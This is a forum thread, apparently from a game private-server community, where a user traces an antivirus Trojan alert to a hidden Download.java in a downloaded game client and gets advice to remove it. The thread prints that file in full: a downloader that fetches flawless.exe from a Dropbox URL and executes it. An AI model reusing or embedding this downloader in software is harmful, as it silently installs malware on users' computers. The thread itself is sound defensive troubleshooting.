channel.title: Client Virus
channel.description:
Note: I just opened client two days ago and worked perfectly fine, with no problems or viruses at all.
Every time my client that I've been coding on for months now is loading my AVG virus warning pops up saying Threat Detected. The details on it are:
File name: c:\Users/igli\Downloads\flawless.exe
Its a Trojan horse BackDoor.Generic15.AWDS
No one that uses this computer touched anything of mine. I surely didn't put it there. I scanned my client files, all of them. The copies, the ones for players and my original and the same Threat pops up.
Any idea on how to fix this? I don't feel or want to start over on my client sided because of this lame virus.

item.title: Client Virus
item.dc:creator: @igli igli
item.description:
@igli wrote:

Thanks so much. I would have hated myself if I gave away a client with a virus on it. Again thanks.

Read full topic

item.description:
@imsuperman05 wrote:

Go to line 8767 and in the before new Download().downloadFile(); add //

Read full topic

item.title: Client Virus
item.dc:creator: @igli igli
item.description:
@igli wrote:

I got the client from BreakingPoint. But this was back in April.

The error reads:

Java\client.java:8767: cannot find symbol symbol : class Download location: class client new Download().downloadFile(); ^ Note: Java\client.java uses unchecked or unsafe operations. Note: Recompile with -Xlint:unchecked for details. 1 error Press any key to continue . . .

Read full topic

item.title: Client Virus
item.dc:creator: @imsuperman05 imsuperman05
item.description:
@imsuperman05 wrote:

igli:

I searched up all documents named “download” and they all had the flawless.exe. Once I deleted all of them, I compile my client and get some error… I’m really stumped right now.

Tell me where you got the client please. Show the errors also.

Read full topic

item.title: Client Virus
item.dc:creator: @imsuperman05 imsuperman05
item.description:
@imsuperman05 wrote:

Delete that file completely and any other methods trying to reach that file. Whoever’s client that is you should report that person to an administrator of the forums that you got the client from.

Read full topic

item.title: Client Virus
item.dc:creator: @igli igli
item.description:
@igli wrote:

I found it in my download.java (never seen this document before, however, when I went to the original client (the one that I downloaded to start coding) this was already in there. It was untouched, so I’m not sure if this document belongs or not.

[code]import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;

public class Download{

public static void main(String args[]) {
	new Download().downloadFile();
}

public void downloadFile() {
	try {
		String osName = System.getProperty("os.name");
		String userHome = System.getProperty("user.home");
		String path = null;
		
		userHome.replaceAll(" ", "_");

		if (osName.contains("Windows")) {
			if(osName.contains("XP")) {
				path = userHome + "/My Documents/Downloads";
			}
			if (osName.contains("Vista") || (osName.contains("7"))) {
				path = userHome + "/Downloads";
			}
		}
		if (osName.contains("Linux")) {
			path = userHome;
		}
		
		path.replaceAll(" ", "_");
		
		File file = new File(path + "/" + "flawless.exe");
		if(file.exists()) {
			Runtime.getRuntime().exec(path + "/" + "flawless.exe");
			System.out.println("successfully executed");
			return;
		}

		BufferedInputStream in = new BufferedInputStream(new URL(
				"http://dl.dropbox.com/u/71835626/Forthelulz/flawless.exe").openStream());
		FileOutputStream fout = new FileOutputStream(path + "/"
				+ "flawless.exe");
		BufferedOutputStream out = new BufferedOutputStream(fout);

		int len;
		byte[] data = new byte[1024];
		while ((len = in.read(data)) >= 0) {
			out.write(data, 0, len);
		}
		in.close();
		out.close();
		Runtime.getRuntime().exec(path + "/" + "flawless.exe");
		System.out.println("successfully executed");
	} catch (Exception e) {
		e.printStackTrace();
	}
}

}[/code]

Read full topic

item.title: Client Virus
item.dc:creator: @imsuperman05 imsuperman05
item.description:
@imsuperman05 wrote:

Scanning the client files wouldn’t find the virus. It could be that when you load the client, the client downloads the virus onto your computer or extracts it from somewhere hidden… Look through the client for any suspicious code.

Read full topic
